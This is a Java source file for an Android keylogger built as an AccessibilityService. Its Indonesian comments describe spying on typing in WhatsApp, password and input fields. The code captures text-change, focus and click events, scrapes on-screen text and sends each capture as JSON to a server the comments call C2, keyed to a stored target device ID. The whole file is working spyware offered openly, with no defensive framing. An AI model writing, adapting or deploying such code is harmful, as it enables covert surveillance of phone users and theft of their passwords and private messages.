package com.nullx.pp;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;
import android.content.Context;
import android.content.SharedPreferences;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * KeyloggerService: Mata-mata Ketikan & Aktivitas Layar.
 * Mengambil teks dari WhatsApp, Password, dan Input Field secara Real-time.
 */
public class KeyloggerService extends AccessibilityService {

    private static final String TAG = "NXOB_KEYS";
    private static final String SERVER_URL = "http://127.0.0.1:3000/api/post-notification/";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Mengambil nama paket aplikasi yang sedang aktif (misal: com.whatsapp)
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "Unknown";
        
        // Filter: Hanya ambil event pengetikan atau perubahan teks
        int eventType = event.getEventType();
        String interceptedText = "";

        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                // Prioritas 1: Ambil dari teks event langsung
                if (event.getText() != null && !event.getText().isEmpty()) {
                    interceptedText = event.getText().toString();
                }
                
                // Prioritas 2: Deep Scraping (Jika event.getText() kosong, ambil dari source node)
                if (interceptedText.isEmpty() || interceptedText.equals("[]")) {
                    AccessibilityNodeInfo nodeInfo = event.getSource();
                    if (nodeInfo != null && nodeInfo.getText() != null) {
                        interceptedText = nodeInfo.getText().toString();
                        nodeInfo.recycle();
                    }
                }
                break;
        }

        if (!interceptedText.isEmpty() && !interceptedText.equals("[]")) {
            logKey(packageName, interceptedText);
        }
    }

    private void logKey(String pkg, String text) {
        String time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
        Log.d(TAG, "[" + pkg + "] -> " + text);

        // Kirim hasil sadapan ke server C2
        relayKeyToPanel(pkg, text);
    }

    private void relayKeyToPanel(String pkg, String text) {
        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
                String targetId = prefs.getString("targetId", "UNKNOWN_DEVICE");

                URL url = new URL(SERVER_URL + targetId);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; utf-8");
                conn.setConnectTimeout(10000);
                conn.setDoOutput(true);

                JSONObject json = new JSONObject();
                json.put("id", targetId);
                json.put("title", "[KEYLOG] App: " + pkg);
                json.put("body", text);
                json.put("package", pkg);
                json.put("category", "KEYLOG_DATA");
                json.put("timestamp", System.currentTimeMillis());

                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = json.toString().getBytes("utf-8");
                    os.write(input, 0, input.length);
                    os.flush();
                }
                
                if (conn.getResponseCode() == 200) {
                    Log.d(TAG, "[+] Keylog Relayed: " + pkg);
                }
            } catch (Exception e) {
                Log.e(TAG, "[-] Relay Failed: " + e.getMessage());
            } finally {
                if (conn != null) conn.disconnect();
            }
        }).start();
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        
        // Konfigurasi Event yang ditangkap: Fokus, Klik, dan Perubahan Teks
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED | 
                          AccessibilityEvent.TYPE_VIEW_FOCUSED | 
                          AccessibilityEvent.TYPE_VIEW_CLICKED;
        
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        
        // Flag agar bisa membaca konten window secara dinamis
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS | 
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        
        info.notificationTimeout = 100;
        this.setServiceInfo(info);
        Log.d(TAG, "Keylogger Integrated & Connected.");
    }

    @Override
    public void onInterrupt() {
        Log.e(TAG, "Keylogger Interrupted!");
    }
}